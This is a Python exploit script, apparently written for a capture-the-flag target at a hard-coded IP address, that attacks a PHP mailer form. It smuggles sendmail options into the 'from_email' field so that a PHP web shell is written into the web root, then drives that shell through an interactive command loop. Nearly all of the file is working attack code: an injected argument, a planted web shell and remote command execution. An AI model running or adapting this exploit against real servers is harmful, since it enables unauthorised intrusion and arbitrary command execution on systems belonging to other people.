import requests
from urllib.parse import quote_plus
import readline

URL = "http://206.189.125.207:31700"


class Exploit:
    def __init__(self, url=URL):
        self.url = url
        self.payload = "<?php system($_GET['cmd']); ?>"
        self.post = {"from_email": "example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php",
                     "from_name": "test",
                     "subject": self.payload,
                     "email_body": "test",
                     "email_list": "foo@bar.com"
                     }

    def send_email(self):
        r = requests.post(self.url+"/rce.php") # check if /rce.php exists
        if r.status_code == 200:
            return
        r = requests.post(self.url+"/mailer.php", data=self.post)
        return
    
    def get_rce(self, cmd):
        r = requests.get(self.url+f"/rce.php?cmd={quote_plus(cmd)}")
        return r.text
    
    def beautyfy(self, text):
        return text[55:-158]
    
    def start(self):
        self.send_email()
        while True:
            try:
                x = self.get_rce(input("$ "))
                readline.get_completer_delims()
                x = self.beautyfy(x)
                print(x)
            except KeyboardInterrupt:
                break
        return
        
if __name__ == "__main__":
    Exploit().start()